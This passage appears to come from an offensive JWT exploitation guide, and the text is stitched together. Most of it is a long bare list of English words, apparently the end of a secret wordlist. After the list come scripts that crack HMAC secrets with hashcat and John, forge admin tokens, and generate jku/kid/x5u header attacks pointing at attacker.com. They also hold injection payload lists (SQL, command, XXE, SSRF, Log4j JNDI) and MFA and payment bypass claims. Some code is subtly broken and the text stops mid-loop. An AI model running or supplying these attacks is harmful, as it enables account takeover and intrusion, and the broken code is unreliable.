goal
ambition
aspiration
desire
wish
hope
expectation
plan
strategy
tactic
method
approach
solution
innovation
creativity
imagination
inspiration
motivation
determination
persistence
patience
discipline
focus
concentration
attention
awareness
consciousness
mindfulness
meditation
relaxation
stress
pressure
tension
anxiety
worry
fear
courage
confidence
self-esteem
self-worth
identity
personality
character
behavior
attitude
mood
emotion
feeling
sensation
perception
thought
idea
concept
theory
hypothesis
assumption
belief
opinion
judgment
decision
choice
preference
taste
style
fashion
trend
culture
art
music
literature
poetry
drama
comedy
tragedy
romance
adventure
mystery
thriller
horror
fantasy
science
fiction
documentary
biography
autobiography
memoir
diary
journal
blog
article
essay
report
review
critique
analysis
commentary
discussion
debate
argument
conversation
dialogue
monologue
speech
presentation
lecture
seminar
workshop
conference
meeting
interview
negotiation
mediation
arbitration
litigation
trial
court
judge
jury
lawyer
attorney
legal
law
rule
regulation
statute
ordinance
code
constitution
amendment
bill
act
legislation
policy
procedure
protocol
guideline
standard
specification
requirement
criterion
benchmark
target
goal
objective
purpose
mission
vision
value
principle
ethic
moral
virtue
vice
good
evil
right
wrong
true
false
fact
fiction
reality
fantasy
dream
nightmare
hope
fear
love
hate
joy
sorrow
happiness
sadness
pleasure
pain
comfort
discomfort
ease
difficulty
simplicity
complexity
clarity
confusion
certainty
uncertainty
knowledge
ignorance
wisdom
foolishness
intelligence
stupidity
genius
idiot
talent
mediocrity
skill
incompetence
ability
disability
strength
weakness
power
powerlessness
control
chaos
order
disorder
organization
disorganization
structure
destruction
creation
annihilation
birth
death
life
existence
nonexistence
being
nothingness
something
nothing
everything
anything
somewhere
nowhere
everywhere
anywhere
someone
no one
everyone
anyone
sometime
never
always
sometimes
often
rarely
seldom
frequently
occasionally
regularly
irregularly
constantly
intermittently
continuously
discontinuously
permanently
temporarily
forever
briefly
momentarily
instantly
immediately
eventually
finally
ultimately
initially
originally
primarily
secondarily
mainly
mostly
partly
partially
completely
totally
entirely
wholly
fully
half
quarter
third
two-thirds
three-quarters
all
none
some
many
few
several
various
different
same
similar
identical
equal
unequal
equivalent
comparable
incomparable
superior
inferior
better
worse
best
worst
first
last
next
previous
former
latter
current
past
present
future
ancient
modern
old
new
young
mature
fresh
stale
recent
distant
near
far
close
remote
local
global
national
international
domestic
foreign
native
alien
familiar
strange
known
unknown
public
private
personal
impersonal
individual
collective
single
multiple
one
two
three
four
five
six
seven
eight
nine
ten
hundred
thousand
million
billion
trillion
zero
infinity
positive
negative
plus
minus
add
subtract
multiply
divide
equal
greater
less
maximum
minimum
average
median
mode
range
variance
deviation
correlation
regression
probability
statistics
mathematics
algebra
geometry
calculus
trigonometry
arithmetic
number
digit
integer
fraction
decimal
percentage
ratio
proportion
equation
formula
function
variable
constant
parameter
coefficient
exponent
logarithm
root
square
cube
power
factorial
permutation
combination
set
subset
union
intersection
complement
element
member
relation
mapping
transformation
operation
addition
subtraction
multiplication
division
modulo
absolute
negative
positive
real
imaginary
complex
rational
irrational
prime
composite
even
odd
natural
whole
counting
ordinal
cardinal
finite
infinite
continuous
discrete
linear
nonlinear
polynomial
exponential
logarithmic
trigonometric
hyperbolic
inverse
direct
proportional
inversely
directly
indirectly
cause
effect
reason
result
consequence
outcome
impact
influence
factor
variable
parameter
attribute
property
characteristic
feature
aspect
dimension
measure
metric
indicator
index
scale
level
degree
extent
amount
quantity
quality
value
worth
price
cost
expense
budget
income
revenue
profit
loss
gain
benefit
advantage
disadvantage
drawback
limitation
constraint
restriction
barrier
obstacle
challenge
problem
issue
difficulty
trouble
complication
complexity
simplicity
ease
convenience
comfort
luxury
necessity
requirement
need
want
desire
wish
preference
choice
option
alternative
possibility
opportunity
chance
probability
likelihood
certainty
uncertainty
risk
safety
security
danger
threat
hazard
peril
jeopardy
vulnerability
weakness
strength
power
force
energy
momentum
velocity
acceleration
speed
distance
time
duration
period
interval
frequency
rate
rhythm
pattern
cycle
sequence
series
order
arrangement
organization
structure
system
framework
model
template
design
plan
blueprint
scheme
strategy
tactic
method
technique
procedure
process
workflow
pipeline
algorithm
protocol
standard
specification
requirement
guideline
rule
regulation
law
policy
principle
concept
idea
theory
hypothesis
assumption
premise
conclusion
inference
deduction
induction
logic
reasoning
argument
evidence
proof
demonstration
example
illustration
case
instance
occurrence
event
incident
situation
circumstance
condition
state
status
position
location
place
site
spot
point
area
region
zone
territory
domain
realm
sphere
field
scope
range
extent
boundary
limit
edge
border
margin
perimeter
circumference
diameter
radius
center
middle
core
heart
essence
substance
material
matter
element
component
part
piece
section
segment
portion
fraction
share
percentage
proportion
ratio
rate
speed
pace
tempo
rhythm
beat
pulse
frequency
wavelength
amplitude
intensity
magnitude
size
dimension
scale
level
grade
rank
class
category
type
kind
sort
variety
species
genus
family
group
set
collection
assembly
gathering
meeting
conference
convention
summit
forum
panel
committee
board
council
committee
team
crew
staff
personnel
workforce
employee
worker
laborer
operator
technician
specialist
expert
professional
amateur
volunteer
intern
trainee
apprentice
student
pupil
learner
beginner
novice
rookie
veteran
senior
junior
manager
supervisor
director
executive
administrator
coordinator
organizer
planner
scheduler
analyst
researcher
investigator
detective
inspector
auditor
examiner
evaluator
assessor
reviewer
critic
judge
referee
umpire
mediator
arbitrator
negotiator
diplomat
ambassador
representative
delegate
agent
broker
dealer
trader
merchant
vendor
supplier
provider
manufacturer
producer
creator
maker
builder
constructor
developer
designer
architect
engineer
programmer
coder
developer
tester
debugger
maintainer
supporter
helper
assistant
aide
secretary
clerk
receptionist
operator
driver
pilot
captain
navigator
guide
instructor
teacher
trainer
coach
mentor
advisor
counselor
therapist
healer
doctor
physician
surgeon
nurse
paramedic
pharmacist
dentist
veterinarian
lawyer
attorney
judge
prosecutor
defender
advocate
representative
spokesperson
presenter
speaker
announcer
broadcaster
journalist
reporter
correspondent
editor
writer
author
poet
novelist
playwright
screenwriter
director
producer
actor
actress
performer
entertainer
musician
singer
composer
conductor
artist
painter
sculptor
photographer
filmmaker
animator
designer
illustrator
architect
engineer
scientist
researcher
inventor
innovator
entrepreneur
businessman
businesswoman
executive
manager
leader
boss
supervisor
foreman
coordinator
organizer
administrator
bureaucrat
official
officer
agent
representative
delegate
ambassador
diplomat
politician
statesman
president
prime
minister
governor
mayor
senator
congressman
representative
delegate
councilman
alderman
commissioner
judge
justice
magistrate
sheriff
police
officer
detective
investigator
inspector
guard
security
bouncer
doorman
watchman
sentinel
sentry
patrol
scout
spy
agent
operative
assassin
mercenary
soldier
warrior
fighter
combatant
veteran
recruit
cadet
trainee
student
pupil
apprentice
intern
volunteer
helper
assistant
supporter
follower
fan
admirer
enthusiast
devotee
believer
disciple
apostle
missionary
evangelist
preacher
minister
priest
pastor
rabbi
imam
monk
nun
saint
prophet
messiah
savior
redeemer
liberator
hero
champion
defender
protector
guardian
keeper
custodian
caretaker
nurse
babysitter
nanny
governess
tutor
teacher
instructor
professor
lecturer
educator
trainer
coach
mentor
guide
advisor
counselor
consultant
expert
specialist
authority
master
guru
sage
wise
man
woman
elder
senior
veteran
experienced
skilled
talented
gifted
genius
prodigy
wonder
miracle
phenomenon
marvel
spectacle
sight
view
scene
picture
image
portrait
photograph
snapshot
selfie
video
movie
film
documentary
animation
cartoon
comic
manga
anime
game
sport
competition
contest
tournament
championship
match
race
marathon
sprint
relay
hurdle
jump
throw
catch
hit
kick
punch
fight
battle
war
conflict
struggle
effort
attempt
try
endeavor
venture
enterprise
business
company
corporation
organization
institution
establishment
foundation
charity
nonprofit
government
agency
department
ministry
bureau
office
headquarters
branch
division
unit
section
team
group
committee
board
council
assembly
parliament
congress
senate
house
chamber
court
tribunal
jury
panel
commission
authority
power
control
command
leadership
management
administration
governance
rule
reign
dominion
sovereignty
independence
freedom
liberty
democracy
republic
monarchy
dictatorship
tyranny
oppression
suppression
repression
censorship
propaganda
indoctrination
brainwashing
manipulation
influence
persuasion
coercion
force
violence
aggression
hostility
conflict
war
peace
harmony
cooperation
collaboration
partnership
alliance
union
federation
confederation
league
association
organization
society
community
group
club
team
crew
gang
band
pack
herd
flock
swarm
crowd
mob
audience
spectator
viewer
observer
witness
participant
player
competitor
contestant
candidate
applicant
nominee
volunteer
member
subscriber
follower
fan
supporter
advocate
champion
defender
opponent
rival
enemy
foe
adversary
competitor
challenger
contender
candidate
hopeful
prospect
potential
possibility
opportunity
chance
luck
fortune
fate
destiny
future
tomorrow
next
week
month
year
decade
century
millennium
eternity
forever
always
never
sometimes
often
rarely
seldom
occasionally
frequently
regularly
constantly
continuously
permanently
temporarily
briefly
momentarily
instantly
immediately
soon
later
eventually
finally
ultimately
EOF

# Use hashcat for brute force
echo "🔨 Using hashcat for JWT brute force..."
echo "$JWT_TOKEN" > jwt_token.txt

# Extract algorithm from JWT
ALGORITHM=$(echo "$JWT_TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq -r '.alg' 2>/dev/null)

case $ALGORITHM in
    "HS256")
        HASHCAT_MODE=16500
        ;;
    "HS384")
        HASHCAT_MODE=16501
        ;;
    "HS512")
        HASHCAT_MODE=16502
        ;;
    *)
        echo "❌ Unsupported algorithm: $ALGORITHM"
        exit 1
        ;;
esac

echo "🎯 Detected algorithm: $ALGORITHM (hashcat mode: $HASHCAT_MODE)"

# Run hashcat
hashcat -m $HASHCAT_MODE jwt_token.txt jwt_secrets.txt -o cracked_jwt.txt --force

# Check if cracked
if [ -f cracked_jwt.txt ]; then
    echo "✅ JWT secret cracked!"
    cat cracked_jwt.txt
    
    # Extract the secret
    SECRET=$(cat cracked_jwt.txt | cut -d: -f2)
    echo "🔑 Secret: $SECRET"
    
    # Create modified JWT with admin privileges
    python3 << EOF
import base64
import json
import hmac
import hashlib

token = "$JWT_TOKEN"
secret = "$SECRET"

parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

# Modify payload for privilege escalation
payload['user'] = 'admin'
payload['role'] = 'administrator'
payload['admin'] = True
payload['permissions'] = ['read', 'write', 'delete', 'admin']

# Create new token
new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

message = f"{new_header}.{new_payload}"
signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
new_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')

new_token = f"{message}.{new_signature}"
print(f"🎯 Modified JWT token: {new_token}")

with open('modified_jwt.txt', 'w') as f:
    f.write(new_token)
EOF

else
    echo "❌ Failed to crack JWT secret"
fi

# Try john the ripper as backup
echo "🔓 Trying John the Ripper..."
john --wordlist=jwt_secrets.txt jwt_token.txt --format=HMAC-SHA256

echo "✅ JWT brute force completed"
```

---

## 🎯 Phase 3: Advanced JWT Exploitation

### JWT Header Manipulation

```bash
#!/bin/bash
# JWT Header Manipulation Script
ORIGINAL_TOKEN=$1

echo "🔧 Testing JWT header manipulation attacks..."

python3 << 'EOF'
import base64
import json
import sys
import requests
import os
from urllib.parse import quote

def decode_jwt_part(part):
    """Decode JWT part with proper padding"""
    missing_padding = len(part) % 4
    if missing_padding:
        part += '=' * (4 - missing_padding)
    
    try:
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded.decode('utf-8'))
    except:
        return None

def encode_jwt_part(data):
    """Encode data to JWT part"""
    json_str = json.dumps(data, separators=(',', ':'))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
    return encoded.rstrip('=')

def test_jku_manipulation(token):
    """Test JWK Set URL (jku) manipulation"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return None
    
    # Add malicious JKU
    malicious_jkus = [
        "http://attacker.com/jwks.json",
        "https://attacker.com/jwks.json",
        "http://localhost/jwks.json",
        "file:///etc/passwd",
        "ftp://attacker.com/jwks.json"
    ]
    
    results = []
    
    for jku in malicious_jkus:
        modified_header = header.copy()
        modified_header['jku'] = jku
        
        new_header = encode_jwt_part(modified_header)
        new_payload = encode_jwt_part(payload)
        new_token = f"{new_header}.{new_payload}.{parts[2]}"
        
        results.append({
            'attack': 'jku_manipulation',
            'jku': jku,
            'token': new_token
        })
    
    return results

def test_kid_manipulation(token):
    """Test Key ID (kid) manipulation"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return None
    
    # Malicious kid values
    malicious_kids = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "/etc/passwd",
        "/dev/null",
        "/proc/version",
        "http://attacker.com/key",
        "file:///etc/passwd",
        "\..\..\..\windows\system32\drivers\etc\hosts",
        "key.pem",
        "../key.pem",
        "../../key.pem",
        "/var/www/html/key.pem",
        "sql_injection'; DROP TABLE users; --",
        "<script>alert('XSS')</script>",
        "${jndi:ldap://attacker.com/exploit}",
        "{{7*7}}",
        "<%=7*7%>",
        "/dev/stdin",
        "/proc/self/environ"
    ]
    
    results = []
    
    for kid in malicious_kids:
        modified_header = header.copy()
        modified_header['kid'] = kid
        
        new_header = encode_jwt_part(modified_header)
        new_payload = encode_jwt_part(payload)
        new_token = f"{new_header}.{new_payload}.{parts[2]}"
        
        results.append({
            'attack': 'kid_manipulation',
            'kid': kid,
            'token': new_token
        })
    
    return results

def test_x5u_manipulation(token):
    """Test X.509 URL (x5u) manipulation"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return None
    
    # Malicious x5u values
    malicious_x5us = [
        "http://attacker.com/cert.pem",
        "https://attacker.com/cert.pem",
        "file:///etc/passwd",
        "ftp://attacker.com/cert.pem",
        "ldap://attacker.com/cert",
        "gopher://attacker.com:70/cert"
    ]
    
    results = []
    
    for x5u in malicious_x5us:
        modified_header = header.copy()
        modified_header['x5u'] = x5u
        
        new_header = encode_jwt_part(modified_header)
        new_payload = encode_jwt_part(payload)
        new_token = f"{new_header}.{new_payload}.{parts[2]}"
        
        results.append({
            'attack': 'x5u_manipulation',
            'x5u': x5u,
            'token': new_token
        })
    
    return results

def test_custom_headers(token):
    """Test custom header injection"""
    parts = token.split('.')
    if len(parts) != 3:
        return None
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return None
    
    # Custom malicious headers
    custom_headers = [
        {'eval': 'system("whoami")'},
        {'cmd': 'ls -la'},
        {'file': '/etc/passwd'},
        {'url': 'http://attacker.com/callback'},
        {'redirect': 'http://attacker.com'},
        {'template': '{{7*7}}'},
        {'ssti': '${7*7}'},
        {'xss': '<script>alert(1)</script>'},
        {'sqli': "'; DROP TABLE users; --"},
        {'xxe': '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'},
        {'ldap': '${jndi:ldap://attacker.com/exploit}'},
        {'rce': '`whoami`'},
        {'path': '../../../etc/passwd'},
        {'include': '/etc/passwd'},
        {'require': 'child_process'},
        {'import': 'os'},
        {'exec': 'cat /etc/passwd'}
    ]
    
    results = []
    
    for custom_header in custom_headers:
        modified_header = header.copy()
        modified_header.update(custom_header)
        
        new_header = encode_jwt_part(modified_header)
        new_payload = encode_jwt_part(payload)
        new_token = f"{new_header}.{new_payload}.{parts[2]}"
        
        results.append({
            'attack': 'custom_header_injection',
            'header': custom_header,
            'token': new_token
        })
    
    return results

# Main execution
if len(sys.argv) < 2:
    print("Usage: python3 script.py <jwt_token>")
    sys.exit(1)

token = sys.argv[1]
all_results = []

print("🔧 Testing JWT header manipulation attacks...")

# Test JKU manipulation
jku_results = test_jku_manipulation(token)
if jku_results:
    all_results.extend(jku_results)
    print(f"✅ Generated {len(jku_results)} JKU manipulation tokens")

# Test KID manipulation
kid_results = test_kid_manipulation(token)
if kid_results:
    all_results.extend(kid_results)
    print(f"✅ Generated {len(kid_results)} KID manipulation tokens")

# Test X5U manipulation
x5u_results = test_x5u_manipulation(token)
if x5u_results:
    all_results.extend(x5u_results)
    print(f"✅ Generated {len(x5u_results)} X5U manipulation tokens")

# Test custom headers
custom_results = test_custom_headers(token)
if custom_results:
    all_results.extend(custom_results)
    print(f"✅ Generated {len(custom_results)} custom header tokens")

# Save all results
with open('header_manipulation_tokens.json', 'w') as f:
    json.dump(all_results, f, indent=2)

print(f"🎯 Total manipulation tokens generated: {len(all_results)}")
print("💾 Results saved to header_manipulation_tokens.json")

# Generate test script
with open('test_header_manipulations.sh', 'w') as f:
    f.write("#!/bin/bash
")
    f.write("# JWT Header Manipulation Test Script
")
    f.write("TARGET_URL=$1

")
    f.write("if [ -z "$TARGET_URL" ]; then
")
    f.write("    echo "Usage: ./test_header_manipulations.sh <target_url>"
")
    f.write("    exit 1
")
    f.write("fi

")
    
    for i, result in enumerate(all_results[:20]):  # Limit to first 20 for testing
        f.write(f"echo "Testing {result['attack']} #{i+1}..."
")
        f.write(f"curl -s -H "Authorization: Bearer {result['token']}" "$TARGET_URL" | head -5
")
        f.write("echo "---"
")
        f.write("sleep 1

")

os.chmod('test_header_manipulations.sh', 0o755)
print("🧪 Test script generated: test_header_manipulations.sh")
EOF
```

### JWT Payload Manipulation

```bash
#!/bin/bash
# JWT Payload Manipulation Script
ORIGINAL_TOKEN=$1
SECRET=$2

echo "🎯 Testing JWT payload manipulation attacks..."

python3 << 'EOF'
import base64
import json
import sys
import hmac
import hashlib
from datetime import datetime, timedelta

def decode_jwt_part(part):
    """Decode JWT part with proper padding"""
    missing_padding = len(part) % 4
    if missing_padding:
        part += '=' * (4 - missing_padding)
    
    try:
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded.decode('utf-8'))
    except:
        return None

def encode_jwt_part(data):
    """Encode data to JWT part"""
    json_str = json.dumps(data, separators=(',', ':'))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode()
    return encoded.rstrip('=')

def create_signed_jwt(header, payload, secret):
    """Create a properly signed JWT"""
    header_encoded = encode_jwt_part(header)
    payload_encoded = encode_jwt_part(payload)
    
    message = f"{header_encoded}.{payload_encoded}"
    
    # Determine hash function based on algorithm
    alg = header.get('alg', 'HS256')
    if alg == 'HS256':
        hash_func = hashlib.sha256
    elif alg == 'HS384':
        hash_func = hashlib.sha384
    elif alg == 'HS512':
        hash_func = hashlib.sha512
    else:
        hash_func = hashlib.sha256
    
    signature = hmac.new(
        secret.encode(),
        message.encode(),
        hash_func
    ).digest()
    
    signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    return f"{message}.{signature_encoded}"

def test_privilege_escalation(token, secret):
    """Test privilege escalation attacks"""
    parts = token.split('.')
    if len(parts) != 3:
        return []
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return []
    
    results = []
    
    # Privilege escalation payloads
    privilege_payloads = [
        # Admin role escalation
        {'role': 'admin', 'admin': True},
        {'role': 'administrator', 'admin': True},
        {'roles': ['admin', 'user'], 'admin': True},
        {'permissions': ['read', 'write', 'delete', 'admin']},
        {'is_admin': True, 'admin': True},
        {'user_type': 'admin', 'admin': True},
        {'access_level': 'admin', 'admin': True},
        {'privilege': 'admin', 'admin': True},
        
        # User ID manipulation
        {'user_id': 1, 'admin': True},  # Often admin is user ID 1
        {'uid': 0, 'admin': True},      # Root user ID
        {'id': 'admin', 'admin': True},
        {'username': 'admin', 'admin': True},
        {'email': 'admin@company.com', 'admin': True},
        
        # Bypass restrictions
        {'verified': True, 'admin': True},
        {'active': True, 'admin': True},
        {'enabled': True, 'admin': True},
        {'approved': True, 'admin': True},
        {'confirmed': True, 'admin': True},
        
        # Time manipulation
        {'exp': int((datetime.now() + timedelta(years=10)).timestamp())},
        {'iat': int((datetime.now() - timedelta(days=1)).timestamp())},
        {'nbf': int((datetime.now() - timedelta(days=1)).timestamp())},
        
        # Scope manipulation
        {'scope': 'admin read write delete'},
        {'scopes': ['admin', 'read', 'write', 'delete']},
        {'authorities': ['ROLE_ADMIN', 'ROLE_USER']},
        {'groups': ['admin', 'users']},
        
        # Custom claims
        {'is_superuser': True, 'admin': True},
        {'superuser': True, 'admin': True},
        {'root': True, 'admin': True},
        {'system': True, 'admin': True},
        {'internal': True, 'admin': True},
        {'service': True, 'admin': True},
        {'api_access': 'full', 'admin': True},
        {'debug': True, 'admin': True},
        {'test': True, 'admin': True}
    ]
    
    for i, privilege_payload in enumerate(privilege_payloads):
        modified_payload = payload.copy()
        modified_payload.update(privilege_payload)
        
        if secret:
            new_token = create_signed_jwt(header, modified_payload, secret)
        else:
            # Create unsigned token for testing
            new_header = encode_jwt_part(header)
            new_payload = encode_jwt_part(modified_payload)
            new_token = f"{new_header}.{new_payload}.{parts[2]}"
        
        results.append({
            'attack': 'privilege_escalation',
            'payload_modification': privilege_payload,
            'token': new_token,
            'description': f"Privilege escalation attempt #{i+1}"
        })
    
    return results

def test_injection_attacks(token, secret):
    """Test injection attacks in JWT payload"""
    parts = token.split('.')
    if len(parts) != 3:
        return []
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return []
    
    results = []
    
    # Injection payloads
    injection_payloads = [
        # SQL Injection
        {'username': "admin'; DROP TABLE users; --"},
        {'email': "test@test.com'; DELETE FROM users WHERE '1'='1"},
        {'user_id': "1 OR 1=1"},
        {'role': "admin' UNION SELECT * FROM passwords --"},
        
        # NoSQL Injection
        {'username': {'$ne': None}},
        {'password': {'$regex': '.*'}},
        {'user_id': {'$gt': ''}},
        {'role': {'$in': ['admin', 'user']}},
        
        # LDAP Injection
        {'username': 'admin)(|(password=*)'},
        {'filter': '(|(uid=admin)(uid=*))'},
        
        # Command Injection
        {'username': 'admin; whoami'},
        {'file': '/etc/passwd; cat /etc/shadow'},
        {'cmd': '`whoami`'},
        {'exec': '$(id)'},
        
        # Template Injection
        {'name': '{{7*7}}'},
        {'template': '${7*7}'},
        {'ssti': '<%=7*7%>'},
        {'expression': '#{7*7}'},
        
        # XSS
        {'username': '<script>alert("XSS")</script>'},
        {'comment': '<img src=x onerror=alert(1)>'},
        {'message': 'javascript:alert(1)'},
        
        # XXE
        {'xml': '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'},
        {'data': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'},
        
        # SSRF
        {'url': 'http://169.254.169.254/latest/meta-data/'},
        {'callback': 'http://attacker.com/callback'},
        {'webhook': 'file:///etc/passwd'},
        
        # Path Traversal
        {'file': '../../../etc/passwd'},
        {'path': '..\..\..\windows\system32\drivers\etc\hosts'},
        {'include': '/etc/passwd'},
        
        # Deserialization
        {'data': 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}'},
        {'object': 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4'},
        
        # Log4j
        {'message': '${jndi:ldap://attacker.com/exploit}'},
        {'log': '${jndi:rmi://attacker.com/exploit}'},
        {'error': '${jndi:dns://attacker.com/exploit}'}
    ]
    
    for i, injection_payload in enumerate(injection_payloads):
        modified_payload = payload.copy()
        modified_payload.update(injection_payload)
        
        if secret:
            new_token = create_signed_jwt(header, modified_payload, secret)
        else:
            new_header = encode_jwt_part(header)
            new_payload = encode_jwt_part(modified_payload)
            new_token = f"{new_header}.{new_payload}.{parts[2]}"
        
        results.append({
            'attack': 'injection',
            'payload_modification': injection_payload,
            'token': new_token,
            'description': f"Injection attack #{i+1}"
        })
    
    return results

def test_business_logic_bypass(token, secret):
    """Test business logic bypass attacks"""
    parts = token.split('.')
    if len(parts) != 3:
        return []
    
    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])
    
    if not header or not payload:
        return []
    
    results = []
    
    # Business logic bypass payloads
    bypass_payloads = [
        # Account status bypass
        {'account_locked': False},
        {'suspended': False},
        {'banned': False},
        {'disabled': False},
        {'deleted': False},
        {'active': True},
        {'enabled': True},
        {'verified': True},
        {'confirmed': True},
        {'approved': True},
        
        # Payment bypass
        {'paid': True},
        {'premium': True},
        {'subscription': 'premium'},
        {'plan': 'enterprise'},
        {'credits': 999999},
        {'balance': 999999.99},
        {'free_trial': True},
        {'trial_expired': False},
        
        # Feature flags
        {'beta_features': True},
        {'experimental': True},
        {'debug_mode': True},
        {'test_mode': True},
        {'admin_panel': True},
        {'api_access': True},
        {'unlimited': True},
        
        # Rate limiting bypass
        {'rate_limit': 999999},
        {'requests_remaining': 999999},
        {'quota': 999999},
        {'throttle': False},
        
        # Geographic bypass
        {'country': 'US'},
        {'region': 'allowed'},
        {'geo_restricted': False},
        {'location_verified': True},
        
        # Age verification bypass
        {'age_verified': True},
        {'adult': True},
        {'age': 25},
        {'birth_year': 1990},
        
        # Multi-factor auth bypass
        {'mfa_verified': True},
        {'two_factor': True},
        {'otp_verified': True},
        {'sms_verified': True},
        {'email_verified': True}
    ]
    
    for i, bypass_payload in enumerate(bypass_payloads):
        modified_payload = payload.copy()
        modified_payload.update(bypass_payload)
        
        if secret:
            new_token = create_signed_jwt(header, modified_payload, secret)
        else:
            new_header = encode_jwt_part(header)
            new_payload = encode_jwt_part(modified_payload)
            new_token = f"{new_header}.{new_payload}.{parts[2]}"
        
        results.append({
            'attack': 'business_logic_bypass',
            'payload_modification': bypass_payload,
            'token': new_token,
            'description': f"Business logic bypass #{i+1}"
        })
    
    return results

# Main execution
if len(sys.argv) < 2:
    print("Usage: python3 script.py <jwt_token> [secret]")
    sys.exit(1)

token = sys.argv[1]
secret = sys.argv[2] if len(sys.argv) > 2 else None

all_results = []

print("🎯 Testing JWT payload manipulation attacks...")

# Test privilege escalation
priv_results = test_privilege_escalation(token, secret)
all_results.extend(priv_results)
print(f"✅ Generated {len(priv_results)} privilege escalation tokens")

# Test injection attacks
injection_results = test_injection_attacks(token, secret)
all_results.extend(injection_results)
print(f"✅ Generated {len(injection_results)} injection attack tokens")

# Test business logic bypass
bypass_results = test_business_logic_bypass(token, secret)
all_results.extend(bypass_results)
print(f"✅ Generated {len(bypass_results)} business logic bypass tokens")

# Save results
with open('payload_manipulation_tokens.json', 'w') as f:
    json.dump(all_results, f, indent=2)

print(f"🎯 Total payload manipulation tokens generated: {len(all_results)}")
print("💾 Results saved to payload_manipulation_tokens.json")

# Generate summary
attack_types = {}
for result in all_results:
    attack_type = result['attack']
    attack_types[attack_type] = attack_types.get(attack_type, 0) + 1

print("
📊 Attack Summary:")
for attack_type, count in attack_types.items():
    print(f"  {attack_type}: {count} tokens")
EOF
```

---

## 💡 Elite Pro Tips

### Advanced JWT Evasion

```bash
# Use different encoding methods
echo "🔄 Testing different JWT encodings..."

# URL encoding
JWT_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$JWT_TOKEN'))")

# Double encoding
JWT_DOUBLE_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote(urllib.parse.quote('$JWT_TOKEN')))")

# Base64 encoding
JWT_B64=$(echo -n "$JWT_TOKEN" | base64)

# Test with different headers
curl -H "Authorization: Bearer $JWT_TOKEN" "$TARGET"
curl -H "Authorization: JWT $JWT_TOKEN" "$TARGET"
curl -H "X-Access-Token: $JWT_TOKEN" "$TARGET"
curl -H "X-Auth-Token: $JWT_TOKEN" "$TARGET"
curl -d "token=$JWT_TOKEN" "$TARGET"
curl -d "jwt=$JWT_TOKEN" "$TARGET"
```

### JWT Fuzzing Framework

```bash
#!/bin/bash
# JWT Fuzzing Framework
JWT_TOKEN=$1
TARGET_URL=$2

echo "🎯 JWT Fuzzing Framework"

# Create comprehensive fuzzing script
python3 << 'EOF'
import itertools
import base64
import json
import sys
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def fuzz_jwt_structure(token):
    """Fuzz JWT structure variations"""
    variations = []
    
    # Original token
    variations.append(('original', token))
    
    # Remove signature
    parts = token.split('.')
    if len(parts) == 3:
        variations.append(('no_signature', f"{parts[0]}.{parts[1]}."))
        variations.append(('empty_signature', f"{parts[0]}.{parts[1]}."))
        
        # Malformed structures
        variations.append(('extra_dot', f"{parts[0]}.{parts[1]}.{parts[2]}."))
        variations.append(('missing_dot', f"{parts[0]}{parts[1]}.{parts[2]}"))
        variations.append(('only_header', parts[0]))
        variations.append(('only_payload', parts[1]))
        variations.append(('header_payload', f"{parts[0]}.{parts[1]}"))
        
        # Duplicate parts
        variations.append(('duplicate_header', f"{parts[0]}.{parts[0]}.{parts[2]}"))
        variations.append(('duplicate_payload', f"{parts[0]}.{parts[1]}.{parts[1]}"))
        variations.append(('duplicate_signature', f"{parts[0]}.{parts[1]}.{parts[2]}.{parts[2]}"))
        
        # Empty parts
        variations.append(('empty_header', f".{parts[1]}.{parts[2]}"))
        variations.append(('empty_payload', f"{parts[0]}..{parts[2]}"))
        variations.append(('all_empty', ".."))
        
        # Invalid base64
        variations.append(('invalid_header', f"invalid.{parts[1]}.{parts[2]}"))
        variations.append(('invalid_payload', f"{parts[0]}.invalid.{parts[2]}"))
        variations.append(('invalid_signature', f"{parts[0]}.{parts[1]}.invalid"))
        
        # Long strings
        long_string = 'A' * 10000
        variations.append(('long_header', f"{long_string}.{parts[1]}.{parts[2]}"))
        variations.append(('long_payload', f"{parts[0]}.{long_string}.{parts[2]}"))
        variations.append(('long_signature', f"{parts[0]}.{parts[1]}.{long_string}"))
        
        # Special characters
        special_chars = ['%00', '%0a', '%0d', '<', '>', '"', "'", '&', '|', ';', '`', '$', '(', ')']
        for char in special_chars:
